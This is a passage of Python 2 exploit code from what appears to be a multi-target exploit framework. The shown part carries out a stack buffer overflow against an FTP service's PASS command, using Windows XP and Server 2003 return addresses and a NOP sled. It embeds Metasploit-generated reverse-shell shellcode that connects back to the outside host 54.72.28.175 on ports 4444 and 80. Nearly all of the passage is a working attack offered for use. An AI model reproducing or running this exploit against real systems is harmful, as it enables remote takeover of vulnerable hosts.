        "\xdc\x05\x3e\x23\xaf\x3d\x2a\x1b\x89\xec\x7a\xc2\xdc\xf4\x04\x4f"
        "\x57\x03\xed\x66\x79\x10\x40\xe1\x73\x16\x78\xb1\x73\x16\x47\xe1"
        "\xdd\x97\x7a\x1d\xfb\x42\xdc\xe3\xdd\x91\x78\x4f\xdd\x70\xed\x60"
        "\xa9\x10\xee\x33\xe6\x23\xed\x66\x70\xb8\xc2\xd8\xcd\x89\xf2\xd0"
        "\x71\xb8\xc4\x4f\xf2\x47\x12\xb0")
        
        
        ##/* win32_reverse -  EXITFUNC=seh LHOST=54.72.28.175 LPORT=4444 Size=312 Encoder=PexFnstenvSub http://metasploit.com */
        ### Required an SEH exit technique for it to funtion correctly
        ## EXITFUNC option sets a function in the payload that specifies a DLL and function to call when the payload is complete.
        reverse_shell = ("\x29\xc9\x83\xe9\xb8\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xeb"
        "\xa2\x95\x2f\x83\xeb\xfc\xe2\xf4\x17\xc8\x7e\x62\x03\x5b\x6a\xd0"
        "\x14\xc2\x1e\x43\xcf\x86\x1e\x6a\xd7\x29\xe9\x2a\x93\xa3\x7a\xa4"
        "\xa4\xba\x1e\x70\xcb\xa3\x7e\x66\x60\x96\x1e\x2e\x05\x93\x55\xb6"
        "\x47\x26\x55\x5b\xec\x63\x5f\x22\xea\x60\x7e\xdb\xd0\xf6\xb1\x07"
        "\x9e\x47\x1e\x70\xcf\xa3\x7e\x49\x60\xae\xde\xa4\xb4\xbe\x94\xc4"
        "\xe8\x8e\x1e\xa6\x87\x86\x89\x4e\x28\x93\x4e\x4b\x60\xe1\xa5\xa4"
        "\xab\xae\x1e\x5f\xf7\x0f\x1e\x6f\xe3\xfc\xfd\xa1\xa5\xac\x79\x7f"
        "\x14\x74\xf3\x7c\x8d\xca\xa6\x1d\x83\xd5\xe6\x1d\xb4\xf6\x6a\xff"
        "\x83\x69\x78\xd3\xd0\xf2\x6a\xf9\xb4\x2b\x70\x49\x6a\x4f\x9d\x2d"
        "\xbe\xc8\x97\xd0\x3b\xca\x4c\x26\x1e\x0f\xc2\xd0\x3d\xf1\xc6\x7c"
        "\xb8\xe1\xc6\x6c\xb8\x5d\x45\x47\xdd\xea\x89\x80\x8d\xca\x84\x73"
        "\x8d\xf1\x1c\xce\x7e\xca\x79\xd6\x41\xc2\xc2\xd0\x3d\xc8\x85\x7e"
        "\xbe\x5d\x45\x49\x81\xc6\xf3\x47\x88\xcf\xff\x7f\xb2\x8b\x59\xa6"
        "\x0c\xc8\xd1\xa6\x09\x93\x55\xdc\x41\x37\x1c\xd2\x15\xe0\xb8\xd1"
        "\xa9\x8e\x18\x55\xd3\x09\x3e\x84\x83\xd0\x6b\x9c\xfd\x5d\xe0\x07"
        "\x14\x74\xce\x78\xb9\xf3\xc4\x7e\x81\xa3\xc4\x7e\xbe\xf3\x6a\xff"
        "\x83\x0f\x4c\x2a\x25\xf1\x6a\xf9\x81\x5d\x6a\x18\x14\x72\xfd\xc8"
        "\x92\x64\xec\xd0\x9e\xa6\x6a\xf9\x14\xd5\x69\xd0\x3b\xca\x65\xa5"
        "\xef\xfd\xc6\xd0\x3d\x5d\x45\x2f")
        
        
        ###port 80 version for use if a firewall blocks other
        ## shouldnt be an issue but i will leave this here all the same
        ##/* win32_reverse -  EXITFUNC=seh LHOST=54.72.28.175 LPORT=80 Size=312 Encoder=PexFnstenvSub http://metasploit.com */
        rev_port80 = ("\x2b\xc9\x83\xe9\xb8\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xeb"
        "\xf7\xb6\x48\x83\xeb\xfc\xe2\xf4\x17\x9d\x5d\x05\x03\x0e\x49\xb7"
        "\x14\x97\x3d\x24\xcf\xd3\x3d\x0d\xd7\x7c\xca\x4d\x93\xf6\x59\xc3"
        "\xa4\xef\x3d\x17\xcb\xf6\x5d\x01\x60\xc3\x3d\x49\x05\xc6\x76\xd1"
        "\x47\x73\x76\x3c\xec\x36\x7c\x45\xea\x35\x5d\xbc\xd0\xa3\x92\x60"
        "\x9e\x12\x3d\x17\xcf\xf6\x5d\x2e\x60\xfb\xfd\xc3\xb4\xeb\xb7\xa3"
        "\xe8\xdb\x3d\xc1\x87\xd3\xaa\x29\x28\xc6\x6d\x2c\x60\xb4\x86\xc3"
        "\xab\xfb\x3d\x38\xf7\x5a\x3d\x08\xe3\xa9\xde\xc6\xa5\xf9\x5a\x18"
        "\x14\x21\xd0\x1b\x8d\x9f\x85\x7a\x83\x80\xc5\x7a\xb4\xa3\x49\x98"
        "\x83\x3c\x5b\xb4\xd0\xa7\x49\x9e\xb4\x7e\x53\x2e\x6a\x1a\xbe\x4a"
        "\xbe\x9d\xb4\xb7\x3b\x9f\x6f\x41\x1e\x5a\xe1\xb7\x3d\xa4\xe5\x1b"
        "\xb8\xb4\xe5\x0b\xb8\x08\x66\x20\xdd\xbf\xaa\xe7\x8d\x9f\xb6\x18"
        "\x8d\xa4\x3f\xa9\x7e\x9f\x5a\xb1\x41\x97\xe1\xb7\x3d\x9d\xa6\x19"
        "\xbe\x08\x66\x2e\x81\x93\xd0\x20\x88\x9a\xdc\x18\xb2\xde\x7a\xc1"
        "\x0c\x9d\xf2\xc1\x09\xc6\x76\xbb\x41\x62\x3f\xb5\x15\xb5\x9b\xb6"
        "\xa9\xdb\x3b\x32\xd3\x5c\x1d\xe3\x83\x85\x48\xfb\xfd\x08\xc3\x60"
        "\x14\x21\xed\x1f\xb9\xa6\xe7\x19\x81\xf6\xe7\x19\xbe\xa6\x49\x98"
        "\x83\x5a\x6f\x4d\x25\xa4\x49\x9e\x81\x08\x49\x7f\x14\x27\xde\xaf"
        "\x92\x31\xcf\xb7\x9e\xf3\x49\x9e\x14\x80\x4a\xb7\x3b\x9f\x46\xc2"
        "\xef\xa8\xe5\xb7\x3d\x08\x66\x48")
        
        ## RET address 7C 94 1E ED
        ##  "\xED\x1E\x94\x7C"        
        
        ### 7C9D30D7   FFE4             JMP ESP
        ### address for XP SP3
        RET_WINXPPRO_SP3 = struct.pack('<L',0x7C9D30D7)
        RET_WINXPPRO_SP2 = struct.pack('<L',0x7C941EED)
        RET_WINSERVER_03_STAN = "\x38\x07\xd2\x77"
        
        payload = ""

        if payload_type == "reverse":
            payload = reverse_shell
            print "use rev"
            
        elif payload_type == "port80":
            payload = rev_port80
            print "use amazon port 80 reverse shell"
            
        elif payload_type == "bind":
            payload = bind_shell
            print "do bind"
            
        
        if OS == "WIN_XP_SP3":
            RET = RET_WINXPPRO_SP3
            
        elif OS == "WIN_XP_SP2":
            RET = RET_WINXPPRO_SP2
            
        elif OS == "WIN_SERV_03_STAN":
            RET = RET_WINSERVER_03_STAN
        
        
                            
        buffer = '\x41' * 4654 + RET + '\x90' * 16 +  payload  + '\xCC' * 8
        try:
            print "\nSending evil buffer..." 
            s.connect((self.ip , self.port))
            data = s.recv(1024)
            s.send('USER offsec' + '\r\n')
            data = s.recv(1024)
            print data
            s.send('PASS ' + buffer + '\r\n')
            data = s.recv(1024)
            print data
            s.close()
        except:
            pass
        
        
        
    #def execute(self,OS,PAYLOAD):
    #    
    #    if self.id == 1:
    #        freefloat_ftp(OS, PAYLOAD)
    #        
    #    elif self.id == 2:
    #       pass
    #    
    #    elif self.id == 3:
    #       ability_ftp(OS, PAYLOAD)
    #       
    #    elif self.id == 4:
    #        self.slmail(OS, PAYLOAD)
    #    
    #    else:
    #        pass